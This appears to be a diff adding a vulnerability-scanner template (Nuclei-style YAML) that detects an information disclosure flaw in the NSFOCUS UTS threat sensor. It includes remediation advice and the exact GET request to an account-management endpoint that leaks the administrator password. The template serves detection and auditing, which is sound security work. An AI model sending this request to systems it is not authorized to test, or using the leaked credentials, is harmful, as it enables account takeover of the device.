@@ -1,0 +1,44 @@
+id: lvmeng-uts-disclosure
+info:
+  name: Lvmeng UTS Disclosure
+  author:
+  - pikpikcu
+  description: |-
+    NSFOCUS UTS (Unified Threat Sensor) Information Disclosure Vulnerability
+    NSFOCUS UTS (Unified Threat Sensor) is a full-traffic threat detection probe for all industries. It combines NSFOCUS's years of security research and threat detection capabilities, leveraging rule engines, virtual sandboxes, threat intelligence, and machine learning technologies. It features broad detection coverage, accurate detection, and interconnectivity, and can detect and analyze advanced threats across different scenarios and trace back security incidents.
+
+    NSFOCUS UTS (Unified Threat Sensor) has an information disclosure vulnerability that allows obtaining the administrator password to log in to the backend
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    http://update.nsfocus.com/update/listBsaUtsDetail/v/F02
+
+    Temporary remediation:
+    1. Remove sensitive information from responses
+    2. Encrypt sensitive information at rest and avoid sending it to the frontend unless necessary
+    3. Transmit sensitive information over encrypted channels and apply data masking where necessary
+    4. Enforce strict permission authentication for sensitive data that must be sent and for page request APIs
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    condition: and
+    part: header
+    words:
+    - application/json
+  - type: word
+    condition: and
+    part: body
+    words:
+    - password
+    - nsfocus_uts
+    - MANAGER_IP
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/webapi/v1/system/accountmanage/account'
+  method: GET
+  headers:
+    Content-Type: application/json
